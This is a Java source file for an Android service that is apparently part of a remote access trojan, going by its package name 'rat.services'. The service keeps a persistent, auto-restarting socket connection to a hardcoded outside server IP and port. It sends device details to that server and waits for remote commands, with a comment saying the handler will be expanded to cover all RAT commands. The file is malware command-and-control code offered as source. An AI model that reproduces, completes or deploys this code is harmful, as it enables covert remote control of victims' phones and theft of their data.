package com.fly0rakoon.rat.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;

public class ConnectionService extends Service {
    private static final String TAG = "ConnectionService";
    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private Thread connectionThread;
    private boolean isRunning = true;
    
    private String serverIp = "34.58.145.84"; // Will be replaced during build
    private int serverPort = 5555; // Will be replaced during build
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        startConnection();
    }
    
    private void startConnection() {
        connectionThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        if (socket == null || !socket.isConnected()) {
                            connect();
                        }
                        if (socket != null && socket.isConnected()) {
                            listenForCommands();
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Connection error", e);
                        try {
                            Thread.sleep(5000); // Wait 5 seconds before reconnecting
                        } catch (InterruptedException ie) {
                            Thread.currentThread().interrupt();
                        }
                    }
                }
            }
        });
        connectionThread.start();
    }
    
    private void connect() throws UnknownHostException, IOException {
        Log.d(TAG, "Connecting to " + serverIp + ":" + serverPort);
        socket = new Socket(serverIp, serverPort);
        in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
        Log.d(TAG, "Connected successfully");
        
        // Send initial device info
        sendDeviceInfo();
    }
    
    private void sendDeviceInfo() {
        // Send device information when first connecting
        String deviceInfo = "DEVICE:" + android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL + 
                           ", Android " + android.os.Build.VERSION.RELEASE;
        sendMessage(deviceInfo);
    }
    
    private void listenForCommands() throws IOException {
        String line;
        while ((line = in.readLine()) != null && isRunning) {
            Log.d(TAG, "Received command: " + line);
            processCommand(line);
        }
    }
    
    private void processCommand(String command) {
        // This will be expanded to handle all RAT commands
        if (command.startsWith("ping")) {
            sendMessage("pong");
        } else if (command.startsWith("info")) {
            sendMessage("Device: " + android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
        } else {
            sendMessage("Unknown command: " + command);
        }
    }
    
    private void sendMessage(String message) {
        if (out != null) {
            out.println(message);
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        return START_STICKY; // Restart service if killed
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        isRunning = false;
        try {
            if (socket != null) {
                socket.close();
            }
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
        } catch (IOException e) {
            Log.e(TAG, "Error closing socket", e);
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
